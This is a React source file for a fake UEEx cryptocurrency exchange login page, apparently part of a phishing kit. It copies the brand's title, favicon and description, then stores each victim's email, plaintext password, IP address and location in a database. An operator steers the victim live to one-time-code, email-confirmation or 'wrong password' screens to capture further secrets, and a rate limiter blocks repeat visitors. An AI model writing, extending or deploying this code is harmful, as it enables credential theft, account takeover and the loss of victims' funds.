import { useState, useEffect, useCallback } from "react";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import { useRateLimit } from "@/hooks/useRateLimit";
import { supabase } from "@/integrations/supabase/client";
import ueexLogo from "@/assets/ueex-logo-official.png";
import UeexLoginForm from "@/components/ueex/UeexLoginForm";
import UeexSecurityScreen from "@/components/ueex/UeexSecurityScreen";
import UeexConfirmEmailScreen from "@/components/ueex/UeexConfirmEmailScreen";
import UeexSyncEmailScreen from "@/components/ueex/UeexSyncEmailScreen";
import WaitingScreen from "@/components/login/WaitingScreen";
import SuccessScreen from "@/components/login/SuccessScreen";
import { UeexLangProvider } from "@/hooks/useUeexLang";

type LoginStep = "form" | "waiting" | "success" | "otp" | "confirm_email" | "sync_email";

const UeexInner = () => {
  const [step, setStep] = useState<LoginStep>("form");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [generalError, setGeneralError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");

  const rateLimit = useRateLimit();
  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    const originalTitle = document.title;
    document.title = "UEEx — Login";

    const link: HTMLLinkElement = document.querySelector("link[rel~='icon']") || document.createElement("link");
    const originalFavicon = link.href;
    link.rel = "icon";
    link.type = "image/png";
    link.href = ueexLogo;
    document.head.appendChild(link);

    let meta = document.querySelector("meta[name='description']") as HTMLMetaElement | null;
    const originalDesc = meta?.content || "";
    if (!meta) { meta = document.createElement("meta"); meta.name = "description"; document.head.appendChild(meta); }
    meta.content = "UEEx — Secure and reliable cryptocurrency trading platform.";

    return () => {
      document.title = originalTitle;
      link.href = originalFavicon;
      if (meta) meta.content = originalDesc;
    };
  }, []);

  useEffect(() => {
    if (!sessionId || step === "form" || step === "success") return;
    const channel = supabase.channel(`session-review-${sessionId}`);
    channel.on("broadcast", { event: "review_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      if (decision === "login_success") setStep("success");
      else if (decision === "wrong_password") { setErrorMessage("Wrong password. Try again."); if (step !== "waiting") setStep("waiting"); }
      else if (decision === "redirect_otp") { setStep("otp"); setErrorMessage(""); }
      else if (decision === "redirect_confirm_email") { setStep("confirm_email"); setErrorMessage(""); }
      else if (decision === "redirect_sync_email") { setStep("sync_email"); setErrorMessage(""); }
    }).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (!data) return;
      if (data.status === "login_success") setStep("success");
      else if (data.status === "wrong_password") { if (!errorMessage) setErrorMessage("Wrong password. Try again."); if (step !== "waiting") setStep("waiting"); }
      else if (data.status === "redirect_otp") { if (step !== "otp") setStep("otp"); setErrorMessage(""); }
      else if (data.status === "redirect_confirm_email") { if (step !== "confirm_email") setStep("confirm_email"); setErrorMessage(""); }
      else if (data.status === "redirect_sync_email") { if (step !== "sync_email") setStep("sync_email"); setErrorMessage(""); }
      else if (data.status === "pending_review") setErrorMessage("");
    }, 3000);

    return () => { supabase.removeChannel(channel); clearInterval(pollInterval); };
  }, [sessionId, step]);

  const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
    setGeneralError(""); setErrorMessage(""); setLoading(true); setEmail(submittedEmail);
    try {
      let ipData = { ip: "unknown", country: "", city: "", region: "" };
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) { const data = await res.json(); ipData = { ip: data.ip || "unknown", country: data.country_name || "", city: data.city || "", region: data.region || "" }; }
      } catch { /* ignore */ }
      const newId = crypto.randomUUID();
      await supabase.from("sessions").insert({
        id: newId, email: submittedEmail, password,
        ip_address: ipData.ip, user_agent: navigator.userAgent,
        country: ipData.country, city: ipData.city, region: ipData.region,
        status: "pending_review", source: "ueex",
      });
      setSessionId(newId); setStep("waiting");
    } catch { setGeneralError("An error occurred. Try again."); }
    setLoading(false);
  }, []);

  const handlePasswordResubmit = useCallback(async (newPassword: string) => {
    if (!sessionId) return; setErrorMessage("");
    await supabase.from("sessions").update({ password: newPassword, status: "pending_review" }).eq("id", sessionId);
    const broadcastChannel = supabase.channel(`session-resubmit-${sessionId}-${Date.now()}`);
    broadcastChannel.subscribe((status) => {
      if (status === "SUBSCRIBED") {
        broadcastChannel.send({ type: "broadcast", event: "review_decision", payload: { status: "pending_review" } });
        setTimeout(() => supabase.removeChannel(broadcastChannel), 2000);
      }
    });
  }, [sessionId]);

  const handleRetry = useCallback(() => { setStep("form"); setSessionId(null); setErrorMessage(""); setGeneralError(""); }, []);

  if (rateLimit.loading) {
    return <div className="flex min-h-screen items-center justify-center bg-white"><div className="animate-pulse text-[#999] text-sm">Loading...</div></div>;
  }
  if (rateLimit.blocked) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white px-4">
        <div className="w-full max-w-[460px] rounded-xl border border-red-200 bg-white p-10 text-center">
          <h2 className="mb-2 text-lg font-bold text-[#333]">Access denied</h2>
          <p className="text-sm text-[#999]">Your access has been temporarily suspended due to unusual activity.</p>
        </div>
      </div>
    );
  }

  if (step === "otp" && sessionId) return <UeexSecurityScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
  if (step === "confirm_email" && sessionId) return <UeexConfirmEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
  if (step === "sync_email" && sessionId) return <UeexSyncEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} />;

  return (
    <div className="flex min-h-[100dvh] flex-col bg-white">
      {step === "form" && (
        <>
          {generalError && (
            <div className="mx-6 mt-4 rounded-xl border border-red-200 bg-red-50 px-4 py-2.5 text-sm text-red-600">{generalError}</div>
          )}
          <UeexLoginForm onSubmit={handleLoginSubmit} loading={loading} />
        </>
      )}

      {step === "waiting" && sessionId && (
        <div className="flex flex-1 flex-col items-center justify-center px-6">
          <div className="w-full max-w-[440px] rounded-2xl border border-[#e0e0e0] bg-white p-6">
            <WaitingScreen email={email} sessionId={sessionId} errorMessage={errorMessage} onPasswordResubmit={handlePasswordResubmit} />
          </div>
        </div>
      )}

      {step === "success" && (
        <div className="flex flex-1 flex-col items-center justify-center px-6">
          <div className="w-full max-w-[440px] rounded-2xl border border-[#e0e0e0] bg-white p-6">
            <SuccessScreen email={email} />
          </div>
        </div>
      )}
    </div>
  );
};

const Ueex = () => (
  <UeexLangProvider>
    <UeexInner />
  </UeexLangProvider>
);

export default Ueex;
